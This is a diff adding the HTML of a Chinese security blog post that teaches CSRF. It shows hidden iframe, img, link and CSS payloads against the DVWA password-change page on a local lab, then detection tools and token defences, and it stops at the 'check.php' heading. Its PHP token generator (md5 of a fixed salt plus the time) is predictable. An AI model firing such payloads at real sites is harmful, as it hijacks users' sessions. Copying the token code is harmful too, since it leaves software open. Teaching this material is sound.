@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="hU53TtoB3-cjkv6fG3QYh11Mpm-dWTnnWSTnv9Dn8Rs">
+  <meta name="msvalidate.01" content="8b8f5ebff3b349ea9050e33da088f3f2">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic%7CSource+Code+Pro:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script class="next-config" data-name="main" type="application/json">{&quot;hostname&quot;:&quot;z0sen.github.io&quot;,&quot;root&quot;:&quot;&#x2F;&quot;,&quot;images&quot;:&quot;&#x2F;images&quot;,&quot;scheme&quot;:&quot;Gemini&quot;,&quot;version&quot;:&quot;8.4.0&quot;,&quot;exturl&quot;:true,&quot;sidebar&quot;:{&quot;position&quot;:&quot;left&quot;,&quot;display&quot;:&quot;post&quot;,&quot;padding&quot;:18,&quot;offset&quot;:12},&quot;copycode&quot;:true,&quot;bookmark&quot;:{&quot;enable&quot;:false,&quot;color&quot;:&quot;#222&quot;,&quot;save&quot;:&quot;auto&quot;},&quot;fancybox&quot;:true,&quot;mediumzoom&quot;:false,&quot;lazyload&quot;:false,&quot;pangu&quot;:false,&quot;comments&quot;:{&quot;style&quot;:&quot;tabs&quot;,&quot;active&quot;:null,&quot;storage&quot;:true,&quot;lazyload&quot;:false,&quot;nav&quot;:null},&quot;motion&quot;:{&quot;enable&quot;:true,&quot;async&quot;:false,&quot;transition&quot;:{&quot;post_block&quot;:&quot;fadeIn&quot;,&quot;post_header&quot;:&quot;fadeInDown&quot;,&quot;post_body&quot;:&quot;fadeInDown&quot;,&quot;coll_header&quot;:&quot;fadeInLeft&quot;,&quot;sidebar&quot;:&quot;fadeInUp&quot;}},&quot;prism&quot;:false,&quot;i18n&quot;:{&quot;placeholder&quot;:&quot;搜索...&quot;,&quot;empty&quot;:&quot;没有找到任何搜索结果：${query}&quot;,&quot;hits_time&quot;:&quot;找到 ${hits} 个搜索结果（用时 ${time} 毫秒）&quot;,&quot;hits&quot;:&quot;找到 ${hits} 个搜索结果&quot;},&quot;path&quot;:&quot;&#x2F;search.xml&quot;,&quot;localsearch&quot;:{&quot;enable&quot;:true,&quot;trigger&quot;:&quot;auto&quot;,&quot;top_n_per_article&quot;:1,&quot;unescape&quot;:false,&quot;preload&quot;:false}}</script>
+<meta name="description" content="CSRF（Cross-site request forery，跨站请求伪造）也被称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSRF漏洞">
+<meta property="og:url" content="https://z0sen.github.io/archives/24515.html">
+<meta property="og:site_name" content="Z0SEN&#39;s Blog">
+<meta property="og:description" content="CSRF（Cross-site request forery，跨站请求伪造）也被称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-10-22T09:30:17.000Z">
+<meta property="article:modified_time" content="2020-10-22T09:30:17.000Z">
+<meta property="article:author" content="z0sen">
+<meta property="article:tag" content="CSRF">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z0sen.github.io/archives/24515.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{&quot;sidebar&quot;:&quot;&quot;,&quot;isHome&quot;:false,&quot;isPost&quot;:true,&quot;lang&quot;:&quot;zh-CN&quot;,&quot;comments&quot;:true,&quot;permalink&quot;:&quot;https:&#x2F;&#x2F;z0sen.github.io&#x2F;archives&#x2F;24515.html&quot;,&quot;path&quot;:&quot;archives&#x2F;24515.html&quot;,&quot;title&quot;:&quot;CSRF漏洞&quot;}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">&quot;&quot;</script>
+<title>CSRF漏洞 | Z0SEN's Blog</title><script src="/js/config.js"></script><link href="https://fonts.loli.net/css?family=Noto+Serif+SC:400,500,700&display=swap&subset=chinese-simplified" rel="stylesheet"><link rel="stylesheet" type="text/css" href="/css/injector/main.css" /><link rel="preload" as="style" href="/css/injector/light.css" /><link rel="preload" as="style" href="/css/injector/dark.css" />
+  
+  <script class="next-config" data-name="google_analytics" type="application/json">{&quot;tracking_id&quot;:&quot;UA-163327487-1&quot;,&quot;only_pageview&quot;:true}</script>
+  <script src="/js/third-party/analytics/google-analytics.js"></script>
+
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?f8210cfb3b395e1e2655776e119d37db"></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Z0SEN's Blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">8</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">3</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">10</span></a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+<script type="text/javascript">
+WIDGET = {FID: 'KchzQlUa1d'}
+</script>
+<script type="text/javascript" src="https://apip.weatherdt.com/float/static/js/r.js?v=1111"></script>
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%BC%80%E5%A4%B4"><span class="nav-number">1.</span> <span class="nav-text">写在开头</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%97%A0%E9%98%B2%E6%8A%A4%E7%9A%84CSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">一、无防护的CSRF漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0X01-GET%E5%9E%8BCSRF%E5%88%A9%E7%94%A8"><span class="nav-number">2.1.</span> <span class="nav-text">0X01 GET型CSRF利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E9%93%BE%E6%8E%A5%E5%88%A9%E7%94%A8-a%E6%A0%87%E7%AD%BE"><span class="nav-number">2.1.1.</span> <span class="nav-text">1. 链接利用(a标签)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-iframe%E5%88%A9%E7%94%A8"><span class="nav-number">2.1.2.</span> <span class="nav-text">2. iframe利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-img%E6%A0%87%E7%AD%BE%E5%88%A9%E7%94%A8"><span class="nav-number">2.1.3.</span> <span class="nav-text">3. img标签利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-CSS-background%E5%88%A9%E7%94%A8"><span class="nav-number">2.1.4.</span> <span class="nav-text">4. CSS-background利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-POST%E5%9E%8BCSRF%E5%88%A9%E7%94%A8"><span class="nav-number">2.2.</span> <span class="nav-text">0x02 POST型CSRF利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81CSRF%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="nav-number">3.</span> <span class="nav-text">二、CSRF漏洞探测</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%89%8B%E5%B7%A5%E6%8E%A2%E6%B5%8B"><span class="nav-number">3.1.</span> <span class="nav-text">0x01 手工探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8E%A2%E6%B5%8B"><span class="nav-number">3.2.</span> <span class="nav-text">0x02 自动化探测</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81Token%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6"><span class="nav-number">4.</span> <span class="nav-text">三、Token防御机制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E8%A1%A5%E9%80%BB%E8%BE%91%E5%88%86%E6%9E%90"><span class="nav-number">4.1.</span> <span class="nav-text">0x01 漏洞修补逻辑分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%AE%80%E5%8D%95%E4%BB%A3%E7%A0%81%E6%A8%A1%E5%9E%8B%E5%88%86%E6%9E%90"><span class="nav-number">4.2.</span> <span class="nav-text">0x02 简单代码模型分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E4%BD%BF%E7%94%A8Token%E8%BF%9B%E8%A1%8CCSRF%E9%98%B2%E5%BE%A1"><span class="nav-number">4.3.</span> <span class="nav-text">0x03 使用Token进行CSRF防御</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%9B%E3%80%81Referer%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6"><span class="nav-number">5.</span> <span class="nav-text">四、Referer防御机制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Referer%E9%98%B2%E5%BE%A1CSRF%E5%8E%9F%E7%90%86"><span class="nav-number">5.1.</span> <span class="nav-text">0x01 Referer防御CSRF原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E4%BD%BF%E7%94%A8Referer%E8%BF%9B%E8%A1%8CCSRF%E9%98%B2%E5%BE%A1"><span class="nav-number">5.2.</span> <span class="nav-text">0x02 使用Referer进行CSRF防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Referer-%E7%BB%95%E8%BF%87"><span class="nav-number">5.3.</span> <span class="nav-text">0x03 Referer 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Refere%E4%B8%BA%E7%A9%BA%E6%9D%A1%E4%BB%B6%E4%B8%8B"><span class="nav-number">5.3.1.</span> <span class="nav-text">1.Refere为空条件下</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%88%A4%E6%96%ADReferer%E6%98%AF%E6%9F%90%E5%9F%9F%E6%83%85%E5%86%B5%E4%B8%8B%E7%BB%95%E8%BF%87"><span class="nav-number">5.3.2.</span> <span class="nav-text">2.判断Referer是某域情况下绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%88%A4%E6%96%ADReferer%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%9F%90%E5%85%B3%E9%94%AE%E8%AF%8D"><span class="nav-number">5.3.3.</span> <span class="nav-text">3.判断Referer是否存在某关键词</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%88%A4%E6%96%ADreferer%E6%98%AF%E5%90%A6%E6%9C%89%E6%9F%90%E5%9F%9F%E5%90%8D"><span class="nav-number">5.3.4.</span> <span class="nav-text">4.判断referer是否有某域名</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%94%E3%80%81CSRF%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1%E6%80%BB%E7%BB%93"><span class="nav-number">6.</span> <span class="nav-text">五、CSRF漏洞防御总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E9%AA%8C%E8%AF%81%E7%A0%81"><span class="nav-number">6.1.</span> <span class="nav-text">0x01 验证码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Referer-Check"><span class="nav-number">6.2.</span> <span class="nav-text">0x02 Referer Check</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Anti-CSRF-Token"><span class="nav-number">6.3.</span> <span class="nav-text">0x03 Anti CSRF Token</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="z0sen"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">z0sen</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3owc2Vu" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z0sen"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cDovL3FxLmNuLmhuL3d0Ng==" title="E-Mail → http:&#x2F;&#x2F;qq.cn.hn&#x2F;wt6"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z0sen.github.io/archives/24515.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="z0sen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z0SEN's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CSRF漏洞
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-10-22 17:30:17" itemprop="dateCreated datePublished" datetime="2020-10-22T17:30:17+08:00">2020-10-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>5.9k</span>
+    </span>
+</div>
+
+            <div class="post-description">CSRF（Cross-site request forery，跨站请求伪造）也被称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <div class="note info no-icon"><h1 id="写在开头"><a href="#写在开头" class="headerlink" title="写在开头"></a>写在开头</h1><p><strong>CSRF的漏洞原理</strong><br>利用目标用户的合法身份，以目标用户的名义执行某些非法操作。</p>
+<p>例如：简单转账案例<br>初始化链接：<span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29tL3BheS5waHA/dXNlcj14eCZhbXA7bW9uZXk9MTAw">http://www.xxx.com/pay.php?user=xx&amp;money=100<i class="fa fa-external-link-alt"></i></span><br>构造恶意链接：<span class="exturl" data-url="aHR0cDovL3d3dy54eHguY29tL3BheS5waHA/dXNlcj0lRTYlODElQjYlRTYlODQlOEYlRTclOTQlQTglRTYlODglQjcmYW1wO21vbmV5PTEwMDAw">http://www.xxx.com/pay.php?user=恶意用户&amp;money=10000<i class="fa fa-external-link-alt"></i></span></p>
+</div>
+
+<h1 id="一、无防护的CSRF漏洞利用"><a href="#一、无防护的CSRF漏洞利用" class="headerlink" title="一、无防护的CSRF漏洞利用"></a>一、无防护的CSRF漏洞利用</h1><h2 id="0X01-GET型CSRF利用"><a href="#0X01-GET型CSRF利用" class="headerlink" title="0X01 GET型CSRF利用"></a>0X01 GET型CSRF利用</h2><p>前面简单转账案例就是一个GET型CSRF利用<br>4种GET型CSRF利用方式：</p>
+<h3 id="1-链接利用-a标签"><a href="#1-链接利用-a标签" class="headerlink" title="1. 链接利用(a标签)"></a>1. 链接利用(a标签)</h3><p>在html中，a标签代表链接，可以将当前的“焦点”指引到其他位置，移动的“焦点”需要发送对应的请求到链接指向的地址，然后返回响应</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href =&quot;请求地址，可以携带GET型参数&quot;&gt; 内容 &lt;/a&gt;</span><br><span class="line"></span><br><span class="line">实例：</span><br><span class="line">&lt;a href =&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#&quot;&gt;点击&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-iframe利用"><a href="#2-iframe利用" class="headerlink" title="2. iframe利用"></a>2. iframe利用</h3><p>iframe标签内容将在页面加载过程中自动进行加载， src指向的位置就是页面请求的位置<br>注意：可使用style=”display:none”来设置不显示iframe加载的内容<br>实例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#&quot; style=&quot;display:none&quot; /&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-img标签利用"><a href="#3-img标签利用" class="headerlink" title="3. img标签利用"></a>3. img标签利用</h3><p>img标签的内容会随着页面加载而被请求，以此src指向的位置会在页面加载过程中进行请求。<br>实例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#&quot; /&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-CSS-background利用"><a href="#4-CSS-background利用" class="headerlink" title="4. CSS-background利用"></a>4. CSS-background利用</h3><p>可以利用 CSS中 background样式中的url来加载远程机器上的内容，从而对url中的内容发送HTTP请求。<br>实例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">body</span><br><span class="line">  &#123; </span><br><span class="line">  background: #00FF00 url(&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#&quot;) no-repeat fixed top;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-POST型CSRF利用"><a href="#0x02-POST型CSRF利用" class="headerlink" title="0x02 POST型CSRF利用"></a>0x02 POST型CSRF利用</h2><p>设置表单用于提交，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=”hidden” name=”username” value=”1111” /&gt;</span><br></pre></td></tr></table></figure>
+<p>使用burpsuite拦截POST包并生成CSRF PoC</p>
+
+
+<p>在burpsuite生成的PoC中可以看到已经使用hidden参数隐藏表单数据</p>
+
+<p>点击Test in browser会生成访问链接，实际攻击时诱使目标访问即可实现攻击</p>
+<h1 id="二、CSRF漏洞探测"><a href="#二、CSRF漏洞探测" class="headerlink" title="二、CSRF漏洞探测"></a>二、CSRF漏洞探测</h1><h2 id="0x01-手工探测"><a href="#0x01-手工探测" class="headerlink" title="0x01 手工探测"></a>0x01 手工探测</h2><p>手工探测原理就在于探测web应用程序是否具有CSRF漏洞的防御措施。</p>
+
+<p>如果Web应用程序的HTTP请求中没有对应的预防措施，那么很大程度上就确定存在CSRF漏洞。</p>
+<h2 id="0x02-自动化探测"><a href="#0x02-自动化探测" class="headerlink" title="0x02 自动化探测"></a>0x02 自动化探测</h2><p>利用自动化探测工具CSRFTester或者burpsuite自带的Generate CSRF PoC</p>
+<p>CSRFTester工具的测试原理：使用代理抓取我们在浏览器中访问过的所有的连接以及所有的表单等信息，通过在CSRFTester中修改相应的表单等信息，重新提交，相当于一次伪造客户端请求，如果修测试的请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。</p>
+<p>1.CSRFTester设置浏览器代理:127.0.0.1:8008，burp是8080<br>2.登录web应用程序，提交表单，在CSRF工具中修改表单内容，查看是否更改，如果更改就存在CSRF漏洞<br>3.生成PoC</p>
+<h1 id="三、Token防御机制"><a href="#三、Token防御机制" class="headerlink" title="三、Token防御机制"></a>三、Token防御机制</h1><h2 id="0x01-漏洞修补逻辑分析"><a href="#0x01-漏洞修补逻辑分析" class="headerlink" title="0x01 漏洞修补逻辑分析"></a>0x01 漏洞修补逻辑分析</h2><p>CSRF漏洞实质：服务器无法准确判断当前请求是否是合法用户的自定义操作<br>漏洞修补逻辑分析:如果服务器在用户登录之后给予用户一个唯一合法令牌，每一次操作过程中，服务器都会验证令牌是否正确，如果正确那么执行操作，不正确不执行操作。<br>一般情况下，给予的令牌写入表单隐藏域的value中，随着表单内容进行提交</p>
+<h2 id="0x02-简单代码模型分析"><a href="#0x02-简单代码模型分析" class="headerlink" title="0x02 简单代码模型分析"></a>0x02 简单代码模型分析</h2><p>如果没有令牌，远程构造CSRF利用POC则直接中招。如果利用在增删改中设置唯一令牌，执行操作时只有提交令牌才能操作的话，就可以有效防止CSRF，若令牌不正确，则不执行操作，并给出提示内容。</p>
+
+
+<h2 id="0x03-使用Token进行CSRF防御"><a href="#0x03-使用Token进行CSRF防御" class="headerlink" title="0x03 使用Token进行CSRF防御"></a>0x03 使用Token进行CSRF防御</h2><p>Token作为识别操作是否是当前用户自己操作的唯一凭证，需要设置为复杂<strong>难以破解</strong>的内容。</p>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">date_default_timezone_set(&quot;Asia/Shanghai&quot;);</span><br><span class="line">function generateToken()&#123;</span><br><span class="line">	$salt = &quot;hello&quot;.date(&quot;h/i/s&quot;);</span><br><span class="line">	$token = md5($salt);</span><br><span class="line">	return $token;</span><br><span class="line">&#125;</span><br><span class="line">$token = generateToken();</span><br><span class="line">echo $token;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>1.登陆验证成功之后，在会话<code>SESSION[&quot;user_token&quot;]</code>中保存Token<br>2.在后台操作中，增删改表单中添加隐藏域hidden，设置value为Token<br>3.提交之后验证Token是否正确</p>
+<p>实例：<br>token_generate.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">    function token_generate()</span><br><span class="line">    &#123;</span><br><span class="line">        $salt = &quot;hello&quot;.date(&quot;h:i:s&quot;);</span><br><span class="line">        $token = md5($salt);</span><br><span class="line">        return $token;</span><br><span class="line">    &#125;</span><br><span class="line">    $token = token_generate();</span><br><span class="line">    $_SESSION[&quot;user_token&quot;] = $token;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;CSRF_TOKEN&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;CSRF_TOKEN&lt;/h1&gt;</span><br><span class="line">        &lt;form action=&quot;check.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;text&quot; value=&quot;111&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&lt;?php echo $token;?&gt;&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>check.php</p>
